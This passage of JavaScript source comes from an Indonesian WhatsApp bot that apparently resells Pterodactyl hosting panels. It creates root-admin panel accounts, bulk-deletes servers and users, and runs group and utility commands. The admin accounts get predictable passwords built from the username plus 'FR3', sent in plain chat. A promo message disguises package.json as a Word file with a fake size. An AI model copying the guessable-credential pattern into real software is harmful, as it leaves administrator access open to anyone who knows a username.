* Jangan Maling SC, Ketahuan Maling ? Auto Delete Akun & No Reff!!
* Simpan Baik² Data Akun Ini
* Buat Panel Seperlunya Aja, Jangan Asal Buat!
* Garansi Aktif 10 Hari
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
await Nvidia.sendMessage(orang, {text: teks}, {quoted: m})
}
break

case "cadmin-v4": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("username"))
let username = text.toLowerCase()
let email = username+"@fr3.com"
let name = capital(args[0])
let password = username+"FR3"
let f = await fetch(global.domainV4 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV4
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var orang
if (!m.isGroup) {
orang = m.sender
await m.reply("*Berhasil membuat admin panel ✅*\nData akun sudah di kirim ke private chat")
} else {
orang = m.chat
}
var teks = `
*Berhasil Membuat Admin Panel ✅*

* *ID :* ${user.id}
* *Nama :* ${user.first_name}
* *Username :* ${user.username}
* *Password :* ${password.toString()}
* *Login :* ${global.domainV4}

*Rules Admin Panel ⚠️*
* Jangan Maling SC, Ketahuan Maling ? Auto Delete Akun & No Reff!!
* Simpan Baik² Data Akun Ini
* Buat Panel Seperlunya Aja, Jangan Asal Buat!
* Garansi Aktif 10 Hari
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
await Nvidia.sendMessage(orang, {text: teks}, {quoted: m})
}
break

case "cadmin-v5": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("username"))
let username = text.toLowerCase()
let email = username+"@fr3.com"
let name = capital(args[0])
let password = username+"FR3"
let f = await fetch(global.domainV5 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV5
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var orang
if (!m.isGroup) {
orang = m.sender
await m.reply("*Berhasil membuat admin panel ✅*\nData akun sudah di kirim ke private chat")
} else {
orang = m.chat
}
var teks = `
*Berhasil Membuat Admin Panel ✅*

* *ID :* ${user.id}
* *Nama :* ${user.first_name}
* *Username :* ${user.username}
* *Password :* ${password.toString()}
* *Login :* ${global.domainV5}

*Rules Admin Panel ⚠️*
* Jangan Maling SC, Ketahuan Maling ? Auto Delete Akun & No Reff!!
* Simpan Baik² Data Akun Ini
* Buat Panel Seperlunya Aja, Jangan Asal Buat!
* Garansi Aktif 10 Hari
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
await Nvidia.sendMessage(orang, {text: teks}, {quoted: m})
}
break

case "developer": case "dev": {
await Nvidia.sendContact(m.chat, [global.dev], m)
}
break

case "opentime": {
    if (!m.isGroup) return m.reply('ᴋʜᴜsᴜs ɢʀᴏᴜᴘ')
    if (!isCreator && !m.isAdmin) return Reply(mess.admin)
    if (!args[0] || isNaN(args[0])) return m.reply('• Format waktu: detik, menit, jam, hari\n• Contoh: 10 detik')
    
    const timeUnits = {
        'detik': 1000,
        'menit': 60000,
        'jam': 3600000,
        'hari': 86400000
    }
    const unit = args[1]?.toLowerCase()
    if (!timeUnits[unit]) return m.reply('• Format waktu: detik, menit, jam, hari\n• Contoh: 10 detik')
    const timer = parseInt(args[0]) * timeUnits[unit]
    m.reply(`Open time ${args[0]} ${unit} dimulai dari sekarang`)
    setTimeout(() => {
        try {
            Nvidia.groupSettingUpdate(m.chat, 'not_announcement')
            m.reply('*Tepat waktu* grup dibuka oleh admin\nsekarang member dapat mengirim pesan')
        } catch (err) {
            m.reply('Terjadi kesalahan saat membuka grup')
            console.log(err)
        }
    }, timer)
}
break

case "closetime": {
    if (!m.isGroup) return m.reply('ᴋʜᴜsᴜs ɢʀᴏᴜᴘ')
    if (!isCreator && !m.isAdmin) return Reply(mess.admin)
    if (!args[0] || isNaN(args[0])) return m.reply('• Format waktu: detik, menit, jam, hari\n• Contoh: 10 detik')
    
    const timeUnits = {
        'detik': 1000,
        'menit': 60000,
        'jam': 3600000,
        'hari': 86400000
    }
    const unit = args[1]?.toLowerCase()
    if (!timeUnits[unit]) return m.reply('• Format waktu: detik, menit, jam, hari\n• Contoh: 10 detik')
    const timer = parseInt(args[0]) * timeUnits[unit]
    m.reply(`Close time ${args[0]} ${unit} dimulai dari sekarang`)
    setTimeout(() => {
        try {
            Nvidia.groupSettingUpdate(m.chat, 'announcement')
            m.reply('*Tepat waktu* grup ditutup oleh admin\nsekarang hanya admin yang dapat mengirim pesan')
        } catch (err) {
            m.reply('Terjadi kesalahan saat menutup grup')
            console.log(err)
        }
    }, timer)
}
break

case "cekdomain":
case "cekhost": {
 if (!args[0]) return m.reply('Masukkan host yang ingin dicek!\nContoh: *cekhost google.com*');
 let host = args[0];
 let apiUrl = `https://fastrestapis.fasturl.cloud/tool/checkhost?host=${host}&mode=http`;
 try {
 let response = await fetch(apiUrl);
 let data = await response.json();
 if (data.status !== 200 || !data.result) {
 return m.reply('Gagal mengambil data. Pastikan host yang dimasukkan benar.');
 }
 let resultText = `🔍 Hasil Pengecekan Host: *${data.result.host}*\n\n`;
 for (let node in data.result.result) {
 let entry = data.result.result[node];
 if (!entry) continue;
 let { country_name, flag_emoji } = entry;
 let responseTime = entry[0][1].toFixed(3);
 let status = entry[0][2];
 let ip = entry[0][4];
 resultText += `${flag_emoji} *${country_name}*\n`;
 resultText += `⏱️ Waktu Respons: ${responseTime} detik\n`;
 resultText += `📡 Status: ${status}\n`;
 resultText += `🌐 IP: ${ip}\n\n`;
 }
 m.reply(resultText);
 } catch (e) {
 console.error(e);
 m.reply('Terjadi kesalahan saat mengambil data.');
 }
}
 break

case "nulis": case "tulis": {
  if (!text) return m.reply('❌ Masukkan teks yang ingin ditulis.\n\nExample: nulis Biyu Tamvan');
  
  m.reply(mess.wait);
  const axios = require('axios');
  let apiUrl = `https://nirkyy.koyeb.app/api/v1/nulis?text=${encodeURIComponent(text)}`;

  try {
    const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
    Nvidia.sendMessage(m.chat, {
      image: Buffer.from(response.data),
      caption: `📝 *Hasil Tulisan* 📝\n\n📌 *Teks:* ${text}`
    }, { quoted: m });
  } catch (error) {
    console.log(error);
    m.reply(`❌ Error\nLogs error : ${error.message}`);
  }
}
break

case "githubstalk":
 if (!q) return m.reply("Masukkan username GitHub!\nContoh: .githubstalk FR3-host");
 
 let urll = `https://simple-api.luxz.xyz/api/tools/githubstalk?user=${q}`;
 
 try {
const axios = require('axios');
 const { data } = await axios.get(urll);
 if (!data.status) return m.reply("User tidak ditemukan!");
 let { username, nickname, bio, id, nodeId, profile_pic, url, type, admin, company, blog, location, email, public_repo, public_gists, followers, following, ceated_at, updated_at } = data.result;
 
 let caption = `*GitHub Stalk*\n\n`;
 caption += `👤 *Username:* ${username}\n`;
 caption += `📛 *Nickname:* ${nickname || "-"}\n`;
 caption += `📜 *Bio:* ${bio || "-"}\n`;
 caption += `🆔 *ID:* ${id}\n`;
 caption += `🔗 *Node ID:* ${nodeId}\n`;
 caption += `🌍 *URL:* ${url}\n`;
 caption += `📌 *Type:* ${type}\n`;
 caption += `🛠 *Admin:* ${admin ? "✅" : "❌"}\n`;
 caption += `🏢 *Company:* ${company || "-"}\n`;
 caption += `🔗 *Blog:* ${blog || "-"}\n`;
 caption += `📍 *Location:* ${location || "-"}\n`;
 caption += `📧 *Email:* ${email || "-"}\n`;
 caption += `📂 *Public Repo:* ${public_repo}\n`;
 caption += `📑 *Public Gists:* ${public_gists}\n`;
 caption += `👥 *Followers:* ${followers}\n`;
 caption += `👤 *Following:* ${following}\n`;
 caption += `📅 *Created At:* ${ceated_at}\n`;
 caption += `🔄 *Updated At:* ${updated_at}\n`;
 Nvidia.sendMessage(m.chat, { image: { url: profile_pic }, caption }, { quoted: m });
 } catch (err) {
 console.error(err);
 m.reply("Terjadi kesalahan saat mengambil data.");
 }
 break
 
case "str": {
if (!text) return m.reply(example("text nya mana?"))
await Nvidia.sendMessage(m.chat, {
 footer: `© 2025 ${botname}`,
 buttons: [
 {
 buttonId: 'action',
 buttonText: { displayText: 'ini pesan interactiveMeta' },
 type: 4,
 nativeFlowInfo: {
 name: 'single_select',
 paramsJson: JSON.stringify({
 title: 'Sellect',
 sections: [
 {
 title: 'pilih metode str',
 highlight_label: 'Recommended',
 rows: [
 {
 title: 'encode char',
 id: `.code encode char ${text}`
 },
 {
 title: 'encode hex',
 id: `.code encode hex ${text}`
 }, 
 {
 title: 'decode char',
 id: `.code decode char ${text}`
 }, 
 {
 title: 'decode hex',
 id: `.code decode hex ${text}`
 } 
 ]
 }
 ]
 })
 }
 }
 ],
 headerType: 1,
 viewOnce: true,
 text: "Masukkan teks yang ingin didekode, lalu pilih metode str yang diinginkan.",
 contextInfo: {
 isForwarded: true, 
 mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
 },
}, {quoted: m})
}
break

case "code": {
 if (!text) return m.reply('Format salah!\nGunakan: .str <mode> <tipe> <teks>\n\nMode:\n - encode\n - decode\n\nTipe:\n - char\n - hex\n\nContoh:\n.str encode char Halo\n.str encode hex Halo\n.str decode char 72,97,108,111\n.str decode hex 48616c6f');
 const args = text.split(' ');
 const mode = args[0]; 
 const type = args[1]; 
 const inputText = args.slice(2).join(' ');
 if (!mode || !type || !inputText) return m.reply('Format salah! Cek contoh penggunaan di atas.');
 let result;
 if (mode === 'encode') {
 if (type === 'char') {
 result = inputText.split('').map(char => char.charCodeAt(0)).join(', ');
 } else if (type === 'hex') {
 result = inputText.split('').map(char => char.charCodeAt(0).toString(16)).join(''); 
 } else {
 return m.reply('Tipe salah! Gunakan "char" atau "hex".');
 }
 } else if (mode === 'decode') {
 if (type === 'char') {
 result = inputText.split(',').map(code => String.fromCharCode(parseInt(code.trim()))).join('');
 } else if (type === 'hex') {
 result = inputText.match(/.{1,2}/g).map(hex => String.fromCharCode(parseInt(hex, 16))).join(''); 
 } else {
 return m.reply('Tipe salah! Gunakan "char" atau "hex".');
 }
 } else {
 return m.reply('Mode salah! Gunakan "encode" atau "decode".');
 }
 let pushname = m.pushName || m.sender.split('@')[0]; 
 let ppUrl = await Nvidia.profilePictureUrl(m.sender, 'image').catch(() => 'https://telegra.ph/file/2f61d40b7cfb440f3cfa7.jpg');
 let pesan = `🍩 *Hasil ${mode.charAt(0).toUpperCase() + mode.slice(1)} (${type.toUpperCase()}):*\n\n${result}`;
 let msg = {
 image: { url: ppUrl },
 caption: `👤 *${pushname}*\n\n${pesan}`,
 contextInfo: { mentionedJid: [m.sender] }
 };
 return Nvidia.sendMessage(m.chat, msg);
}
break

case "server-v3": {
if (!isCreator) return Reply(mess.owner)
 const argsString = body.trim();
 const excludedIds = argsString.split(',').slice(1).map(id => id.trim()); // Ambil semua ID setelah koma

 if (excludedIds.length === 0) {
 return m.reply("Tolong masukkan ID yang ingin dikecualikan setelah tanda koma.");
 }

 try {
 // Mendapatkan daftar server dari server 2
 let f = await fetch(global.domainV3 + "/api/application/servers", {
 method: "GET",
 headers: {
 "Accept": "application/json",
 "Content-Type": "application/json",
 "Authorization": "Bearer " + global.apikeyV3,
 }
 });

 let res = await f.json();
 let servers = res.data;

 if (!servers || servers.length === 0) {
 return m.reply('Tidak ada server yang ditemukan di server 2.');
 }

 for (let server of servers) {
 let s = server.attributes;

 // Jika server ID ada di daftar pengecualian, lewati
 if (excludedIds.includes(s.id.toString())) {
 m.reply(`*Server dengan ID ${s.id} (${s.name}) dikecualikan dari penghapusan.*`);
 continue;
 }

 // Menghapus server
 let deleteServer = await fetch(global.domainV3 + "/api/application/servers/" + s.id, {
 method: "DELETE",
 headers: {
 "Accept": "application/json",
 "Content-Type": "application/json",
 "Authorization": "Bearer " + global.apikeyV3,
 }
 });

 if (deleteServer.ok) {
 m.reply(`*Berhasil menghapus server dengan ID: ${s.id} (${s.name})*`);
 } else {
 let errorText = await deleteServer.text();
 m.reply(`Gagal menghapus server dengan ID: ${s.id}. Error: ${deleteServer.status} - ${errorText}`);
 }
 }

 m.reply('*Semua server berhasil dihapus dari server 2 kecuali yang dikecualikan!*');
 } catch (error) {
 return m.reply('Terjadi kesalahan di server 2: ' + error.message);
 }
 break;
}

case "user-v3": {
 if (!isOwner && !isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');
 
 try {
 // Mengambil daftar user dari server 2
 let f = await fetch(global.domainV3 + "/api/application/users", {
 method: "GET",
 headers: {
 "Accept": "application/json",
 "Content-Type": "application/json",
 "Authorization": "Bearer " + global.apikeyV3,
 }
 });

 let res = await f.json();
 let users = res.data;

 if (!users || users.length === 0) {
 return m.reply('Tidak ada user yang ditemukan di server 2.');
 }

 // Loop melalui setiap user
 for (let user of users) {
 let u = user.attributes;

 // Hanya hapus user yang bukan admin (root_admin = false)
 if (!u.root_admin) {
 let deleteUser = await fetch(global.domainV3 + "/api/application/users/" + u.id, {
 method: "DELETE",
 headers: {
 "Accept": "application/json",
 "Content-Type": "application/json",
 "Authorization": "Bearer " + global.apikeyV3,
 }
 });

 // Cek status penghapusan user
 if (deleteUser.ok) {
 m.reply(`*Berhasil menghapus user dengan ID: ${u.id}* dari server 2`);
 } else {
 let errorText = await deleteUser.text();
 m.reply(`Gagal menghapus user dengan ID: ${u.id} dari server 2. Error: ${deleteUser.status} - ${errorText}`);
 }
 }
 }

 m.reply('*Semua user kecuali admin berhasil dihapus dari server 2!*');
 } catch (error) {
 return m.reply('Terjadi kesalahan: ' + error.message);
 }
 break;
 }
 break
 
 case "admin-v3": {
 if (!isCreator) return Reply(mess.owner)
 const argsString = body.trim();
 const excludeIds = argsString.split(',').slice(1).map(id => id.trim()); // Ambil semua ID setelah koma

 if (excludeIds.length === 0) {
 return m.reply('Tolong masukkan ID yang ingin dikecualikan setelah tanda koma.\nContoh: ${command} , 48, 49, 50');
 }

 try {
 let f = await fetch(global.domainV3 + "/api/application/users", {
 method: "GET",
 headers: {
 "Accept": "application/json",
 "Content-Type": "application/json",
 "Authorization": "Bearer " + global.apikeyV3,
 }
 });

 let res = await f.json();
 let users = res.data;

 if (!users || users.length === 0) {
 return m.reply('Tidak ada user yang ditemukan.');
 }

 for (let user of users) {
 let u = user.attributes;

 // Jika ID ada di daftar pengecualian, lewati proses penghapusan
 if (excludeIds.includes(u.id.toString())) {
 m.reply(`Mengabaikan user dengan ID: ${u.id} (${u.username})\n> *_© Developer : FR3HOSTING_*`);
 continue;
 }

 let deleteUser = await fetch(global.domainV3 + "/api/application/users/" + u.id, {
 method: "DELETE",
 headers: {
 "Accept": "application/json",
 "Content-Type": "application/json",
 "Authorization": "Bearer " + global.apikeyV3,
 }
 });

 if (deleteUser.ok) {
 m.reply(`Berhasil menghapus user dengan ID: ${u.id} (${u.username})\n> *_© Developer : FR3HOSTING_*`);
 } else {
 let errorText = await deleteUser.text();
 m.reply(`Gagal menghapus user dengan ID: ${u.id}. Error: ${deleteUser.status} - ${errorText}`);
 }
 }

 m.reply('Semua user, kecuali yang dikecualikan, berhasil dihapus!');
 } catch (error) {
 return m.reply('Terjadi kesalahan: ' + error.message);
}
};
break;
 
case "server-v4": {
if (!isCreator) return Reply(mess.owner)
 const argsString = body.trim();
 const excludedIds = argsString.split(',').slice(1).map(id => id.trim()); // Ambil semua ID setelah koma

 if (excludedIds.length === 0) {
 return m.reply("Tolong masukkan ID yang ingin dikecualikan setelah tanda koma.");
 }

 try {
 // Mendapatkan daftar server dari server 2
 let f = await fetch(global.domainV4 + "/api/application/servers", {
 method: "GET",
 headers: {
 "Accept": "application/json",
 "Content-Type": "application/json",
 "Authorization": "Bearer " + global.apikeyV4,
 }
 });

 let res = await f.json();
 let servers = res.data;

 if (!servers || servers.length === 0) {
 return m.reply('Tidak ada server yang ditemukan di server 2.');
 }

 for (let server of servers) {
 let s = server.attributes;

 // Jika server ID ada di daftar pengecualian, lewati
 if (excludedIds.includes(s.id.toString())) {
 m.reply(`*Server dengan ID ${s.id} (${s.name}) dikecualikan dari penghapusan.*`);
 continue;
 }

 // Menghapus server
 let deleteServer = await fetch(global.domainV4 + "/api/application/servers/" + s.id, {
 method: "DELETE",
 headers: {
 "Accept": "application/json",
 "Content-Type": "application/json",
 "Authorization": "Bearer " + global.apikeyV4,
 }
 });

 if (deleteServer.ok) {
 m.reply(`*Berhasil menghapus server dengan ID: ${s.id} (${s.name})*`);
 } else {
 let errorText = await deleteServer.text();
 m.reply(`Gagal menghapus server dengan ID: ${s.id}. Error: ${deleteServer.status} - ${errorText}`);
 }
 }

 m.reply('*Semua server berhasil dihapus dari server 2 kecuali yang dikecualikan!*');
 } catch (error) {
 return m.reply('Terjadi kesalahan di server 2: ' + error.message);
 }
 break;
}

case "user-V4": {
 if (!isOwner && !isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');
 
 try {
 // Mengambil daftar user dari server 2
 let f = await fetch(global.domainV4 + "/api/application/users", {
 method: "GET",
 headers: {
 "Accept": "application/json",
 "Content-Type": "application/json",
 "Authorization": "Bearer " + global.apikeyV4,
 }
 });

 let res = await f.json();
 let users = res.data;

 if (!users || users.length === 0) {
 return m.reply('Tidak ada user yang ditemukan di server 2.');
 }

 // Loop melalui setiap user
 for (let user of users) {
 let u = user.attributes;

 // Hanya hapus user yang bukan admin (root_admin = false)
 if (!u.root_admin) {
 let deleteUser = await fetch(global.domainV4 + "/api/application/users/" + u.id, {
 method: "DELETE",
 headers: {
 "Accept": "application/json",
 "Content-Type": "application/json",
 "Authorization": "Bearer " + global.apikeyV4,
 }
 });

 // Cek status penghapusan user
 if (deleteUser.ok) {
 m.reply(`*Berhasil menghapus user dengan ID: ${u.id}* dari server 2`);
 } else {
 let errorText = await deleteUser.text();
 m.reply(`Gagal menghapus user dengan ID: ${u.id} dari server 2. Error: ${deleteUser.status} - ${errorText}`);
 }
 }
 }

 m.reply('*Semua user kecuali admin berhasil dihapus dari server 2!*');
 } catch (error) {
 return m.reply('Terjadi kesalahan: ' + error.message);
 }
 break;
 }
 break
 
 case "admin-V4": {
 if (!isCreator) return Reply(mess.owner)
 const argsString = body.trim();
 const excludeIds = argsString.split(',').slice(1).map(id => id.trim()); // Ambil semua ID setelah koma

 if (excludeIds.length === 0) {
 return m.reply("Tolong masukkan ID yang ingin dikecualikan setelah tanda koma.");
 }

 try {
 let f = await fetch(global.domainV4 + "/api/application/users", {
 method: "GET",
 headers: {
 "Accept": "application/json",
 "Content-Type": "application/json",
 "Authorization": "Bearer " + global.apikeyV4,
 }
 });

 let res = await f.json();
 let users = res.data;

 if (!users || users.length === 0) {
 return m.reply('Tidak ada user yang ditemukan.');
 }

 for (let user of users) {
 let u = user.attributes;

 // Jika ID ada di daftar pengecualian, lewati proses penghapusan
 if (excludeIds.includes(u.id.toString())) {
 m.reply(`Mengabaikan user dengan ID: ${u.id} (${u.username})\n> *_© Developer : FR3HOSTING_*`);
 continue;
 }

 let deleteUser = await fetch(global.domainV4 + "/api/application/users/" + u.id, {
 method: "DELETE",
 headers: {
 "Accept": "application/json",
 "Content-Type": "application/json",
 "Authorization": "Bearer " + global.apikeyV4,
 }
 });

 if (deleteUser.ok) {
 m.reply(`Berhasil menghapus user dengan ID: ${u.id} (${u.username})\n> *_© Developer : FR3HOSTING_*`);
 } else {
 let errorText = await deleteUser.text();
 m.reply(`Gagal menghapus user dengan ID: ${u.id}. Error: ${deleteUser.status} - ${errorText}`);
 }
 }

 m.reply('Semua user, kecuali yang dikecualikan, berhasil dihapus!');
 } catch (error) {
 return m.reply('Terjadi kesalahan: ' + error.message);
 }
 break;
 }
 break
 
 case "server-v5": {
if (!isCreator) return Reply(mess.owner)
 const argsString = body.trim();
 const excludedIds = argsString.split(',').slice(1).map(id => id.trim()); // Ambil semua ID setelah koma

 if (excludedIds.length === 0) {
 return m.reply("Tolong masukkan ID yang ingin dikecualikan setelah tanda koma.");
 }

 try {
 // Mendapatkan daftar server dari server 2
 let f = await fetch(global.domainV5 + "/api/application/servers", {
 method: "GET",
 headers: {
 "Accept": "application/json",
 "Content-Type": "application/json",
 "Authorization": "Bearer " + global.apikeyV5,
 }
 });

 let res = await f.json();
 let servers = res.data;

 if (!servers || servers.length === 0) {
 return m.reply('Tidak ada server yang ditemukan di server 2.');
 }

 for (let server of servers) {
 let s = server.attributes;

 // Jika server ID ada di daftar pengecualian, lewati
 if (excludedIds.includes(s.id.toString())) {
 m.reply(`*Server dengan ID ${s.id} (${s.name}) dikecualikan dari penghapusan.*`);
 continue;
 }

 // Menghapus server
 let deleteServer = await fetch(global.domainV5 + "/api/application/servers/" + s.id, {
 method: "DELETE",
 headers: {
 "Accept": "application/json",
 "Content-Type": "application/json",
 "Authorization": "Bearer " + global.apikeyV5,
 }
 });

 if (deleteServer.ok) {
 m.reply(`*Berhasil menghapus server dengan ID: ${s.id} (${s.name})*`);
 } else {
 let errorText = await deleteServer.text();
 m.reply(`Gagal menghapus server dengan ID: ${s.id}. Error: ${deleteServer.status} - ${errorText}`);
 }
 }

 m.reply('*Semua server berhasil dihapus dari server 2 kecuali yang dikecualikan!*');
 } catch (error) {
 return m.reply('Terjadi kesalahan di server 2: ' + error.message);
 }
 break;
}

case "user-V5": {
 if (!isOwner && !isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');
 
 try {
 // Mengambil daftar user dari server 2
 let f = await fetch(global.domainV5 + "/api/application/users", {
 method: "GET",
 headers: {
 "Accept": "application/json",
 "Content-Type": "application/json",
 "Authorization": "Bearer " + global.apikeyV5,
 }
 });

 let res = await f.json();
 let users = res.data;

 if (!users || users.length === 0) {
 return m.reply('Tidak ada user yang ditemukan di server 2.');
 }

 // Loop melalui setiap user
 for (let user of users) {
 let u = user.attributes;

 // Hanya hapus user yang bukan admin (root_admin = false)
 if (!u.root_admin) {
 let deleteUser = await fetch(global.domainV5 + "/api/application/users/" + u.id, {
 method: "DELETE",
 headers: {
 "Accept": "application/json",
 "Content-Type": "application/json",
 "Authorization": "Bearer " + global.apikeyV5,
 }
 });

 // Cek status penghapusan user
 if (deleteUser.ok) {
 m.reply(`*Berhasil menghapus user dengan ID: ${u.id}* dari server 2`);
 } else {
 let errorText = await deleteUser.text();
 m.reply(`Gagal menghapus user dengan ID: ${u.id} dari server 2. Error: ${deleteUser.status} - ${errorText}`);
 }
 }
 }

 m.reply('*Semua user kecuali admin berhasil dihapus dari server 2!*');
 } catch (error) {
 return m.reply('Terjadi kesalahan: ' + error.message);
 }
 break;
 }
 break
 
 case "admin-V5": {
 if (!isCreator) return Reply(mess.owner)
 const argsString = body.trim();
 const excludeIds = argsString.split(',').slice(1).map(id => id.trim()); // Ambil semua ID setelah koma

 if (excludeIds.length === 0) {
 return m.reply("Tolong masukkan ID yang ingin dikecualikan setelah tanda koma.");
 }

 try {
 let f = await fetch(global.domainV5 + "/api/application/users", {
 method: "GET",
 headers: {
 "Accept": "application/json",
 "Content-Type": "application/json",
 "Authorization": "Bearer " + global.apikeyV5,
 }
 });

 let res = await f.json();
 let users = res.data;

 if (!users || users.length === 0) {
 return m.reply('Tidak ada user yang ditemukan.');
 }

 for (let user of users) {
 let u = user.attributes;

 // Jika ID ada di daftar pengecualian, lewati proses penghapusan
 if (excludeIds.includes(u.id.toString())) {
 m.reply(`Mengabaikan user dengan ID: ${u.id} (${u.username})\n> *_© Developer : FR3HOSTING_*`);
 continue;
 }

 let deleteUser = await fetch(global.domainV5 + "/api/application/users/" + u.id, {
 method: "DELETE",
 headers: {
 "Accept": "application/json",
 "Content-Type": "application/json",
 "Authorization": "Bearer " + global.apikeyV5,
 }
 });

 if (deleteUser.ok) {
 m.reply(`Berhasil menghapus user dengan ID: ${u.id} (${u.username})\n> *_© Developer : FR3HOSTING_*`);
 } else {
 let errorText = await deleteUser.text();
 m.reply(`Gagal menghapus user dengan ID: ${u.id}. Error: ${deleteUser.status} - ${errorText}`);
 }
 }

 m.reply('Semua user, kecuali yang dikecualikan, berhasil dihapus!');
 } catch (error) {
 return m.reply('Terjadi kesalahan: ' + error.message);
 }
break;
}
break

case "npm": case "npmsearch": {
  if (!text) return m.reply('Contoh: .npmsearch axios')

  const axios = require('axios')

  try {
    const { data } = await axios.get(`https://registry.npmjs.org/${encodeURIComponent(text)}`)
    const latest = data['dist-tags'].latest
    const info = data.versions[latest]

    const teks = `Berikut ${info.name} Terbaru\n📦 *NPM Package Info*\n\n` +
      `• Nama       : ${info.name}\n` +
      `• Versi      : ${latest}\n` +
      `• Author     : ${info.author?.name || '-'}\n` +
      `• Deskripsi  : ${info.description || '-'}\n` +
      `• License    : ${info.license || '-'}\n` +
      `• Homepage   : ${info.homepage || '-'}\n` +
      `• Link       : https://www.npmjs.com/package/${info.name}\n`

    m.reply(teks)
  } catch (e) {
    m.reply('❌ Package tidak ditemukan atau terjadi kesalahan.')
    console.error(e)
  }

  return
}
break

case "clearsession": case "clsesi": case "clearsesi": {

 if (!isCreator) return Reply(global.mess.owner)
const dirsesi = fs.readdirSync("./session").filter(e => e !== "creds.json")
const dirsampah = fs.readdirSync("./library/database/sampah").filter(e => e !== "A")
for (const i of dirsesi) {
await fs.unlinkSync("./session/" + i)
}
for (const u of dirsampah) {
await fs.unlinkSync("./library/database/sampah/" + u)
}
m.reply(`*Berhasil membersihkan sampah ✅*
*${dirsesi.length}* sampah session\n*${dirsampah.length}* sampah file`)
}
break

case "block": case "blokir": case "blok": {
if (!isCreator) return Reply(global.mess.owner)
if (!m.isGroup && !m.quoted && !text) return m.reply(example("@tag/nomornya"))
const mem = !m.isGroup ? m.chat : m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : ""
await Nvidia.updateBlockStatus(mem, "block");
if (!m.isGroup) Nvidia.sendMessage(m.chat, {text: `Berhasil memblokir @${mem.split('@')[0]}`, mentions: [mem]}, {quoted: m})
}
break

case "buyscript": {
	let text = `
╭────────────────────────────
│    *✨ FR3hosting✨*  
╰────────────────────────────

╭─「 *🎉 Promo Spesial Script* 」─╮
│ 🎯 *Harga Script:*  *Rp 35.000* (Free Update!)
│ 🆓 *Free Update:*  *Rp 25.000* (No Update!)
│ 🔒 *No ENC:* 95% 🎁
│ 
│ *✨ Keunggulan Script:* ✨
│ 🔥 *Mudah Digunakan:* Dengan tampilan responsif dan user-friendly.
│ ⚡ *Fitur Lengkap & Update Berkala:* Dapatkan pembaruan otomatis.
│ 🛡️ *Sistem Aman & Stabil:* Keamanan data terjamin!
│ 💬 *Support Terbaik:* Tim kami siap membantu kapan saja.
│
│ *📜 Cara Pembelian:*
│ 1.💳 .buysc
│ 2.✅ .owner (lebih rekomendasi)
╰────────────────────────────

╭─「 *✨ Mengapa Memilih Script Ini?* 」─╮
│ 🚀 Script ini memberikan *fasilitas premium* dengan harga *terjangkau*!
│ 🌐 Kami memberikan pembaruan secara *gratis* untuk pengalaman lebih baik.
│ 💼 Dengan sistem yang *stabil dan aman*, Anda dapat menggunakan script tanpa khawatir.
│ 🔒 Keamanan Ketat Dengan Key Dan Database
╰────────────────────────────

🔑 *Semua serba otomatis, tidak ribet!*
👉 *Untuk beli script, langsung hubungi Fr3Hosting di nomor bot!*

══════════════════════════
   *Terima kasih telah menggunakan layanan kami!*
══════════════════════════
`
 await Nvidia.sendMessage(m.chat, {
  footer: `© 2025 ${botname}`,
  buttons: [
    {
      buttonId: `.buyscript`,
      buttonText: { displayText: 'Buy Scrip?' },
      type: 1
    },
    {
      buttonId: `.owner`,
      buttonText: { displayText: 'Owner' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  document: fs.readFileSync("./package.json"),
  fileName: `By ${namaOwner} </>`,
  mimetype: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
  fileLength: 99999999,
  caption: text,
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender], 
   forwardedNewsletterMessageInfo: {
   newsletterJid: global.idSaluran,
   newsletterName: global.namaSaluran
   }, 
    externalAdReply: {
      title: `${botname} - ${versi}`,
      body: `?? Runtime : ${runtime(process.uptime())}`,
      thumbnailUrl: global.image.menu,
      sourceUrl: linkSaluran,
      mediaType: 1,
      renderLargerThumbnail: true,
    },
  },
})
}
break

case "sentesti": case "uptesti": {
  const { downloadMediaMessage } = require('@whiskeysockets/baileys');

  if (!m.quoted || !m.quoted.message.imageMessage) {
    await Nvidia.sendMessage(m.chat, { text: '⚠️ Reply ke foto yang ingin diupload!' }, { quoted: m });
    return;
  }

  const input = q || args.join(' ');
  if (!input) {
    await Nvidia.sendMessage(m.chat, { text: '⚠️ Format: .uptesti <nama_barang>|<pembayaran_via>|<harga>' }, { quoted: m });
    return;
  }

  const [barang, pembayaran, harga] = input.split('|').map(a => a.trim());
  if (!barang || !pembayaran || !harga) {
    await Nvidia.sendMessage(m.chat, { text: '⚠️ Mohon isi semua data!\nFormat: .uptesti <nama_barang>|<pembayaran_via>|<harga>' }, { quoted: m });
    return;
  }

  const mediaBuffer = await downloadMediaMessage(
    { key: m.quoted.key, message: m.quoted.message },
    'buffer',
    {},
  );

  const caption = `📝 TESTIMONI FR3
───────────────────────────────
*📦 BARANG:* ${barang}
*💳 PEMBAYARAN VIA:* ${pembayaran}
*🛒 HARGA:* ${harga}
───────────────────────────────

